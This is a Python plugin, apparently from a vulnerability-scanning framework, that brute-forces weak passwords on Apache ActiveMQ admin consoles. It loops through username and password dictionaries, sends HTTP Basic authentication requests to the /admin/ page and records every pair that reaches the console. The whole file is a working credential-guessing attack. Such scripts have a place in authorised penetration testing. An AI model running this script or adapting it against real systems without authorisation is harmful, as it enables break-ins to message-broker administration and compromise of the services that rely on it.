#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import os
from lib.core.data import paths
from base64 import b64encode
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.ACTIVEMQ
        self.name = 'activemq burst'
        self.keyword = ['web', 'activemq', 'burst']
        self.info = 'Burst activemq weakpass.'
        self.type = VUL_TYPE.WEAKPASS
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file(os.path.join(paths.DICT_PATH, 'activemq_usernames.txt'))
            passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file(os.path.join(paths.DICT_PATH, 'activemq_passwords.txt'))
            url = self.base_url + "admin/"
            async with ClientSession() as session:
                async with session.get(url=url) as res:
                    if res != None and res.status == 401 :
                        async for (username, password) in self.generate_dict(usernamedic, passworddic):
                            key = str(b64encode(bytes(":".join([username, password]), 'utf-8')), 'utf-8')
                            headers = {"Authorization": 'Basic %s' % key}
                            async with session.get(url=url, headers=headers) as res:
                                if res != None:
                                    text = await res.text()
                                    if 'Console' in text:
                                        self.flag = 1
                                        self.req.append({"username": username, "password": password})
                                        self.res.append({"info": username + "/" + password,
                                                         "key": "Authorization: " + ":".join([username, password])})

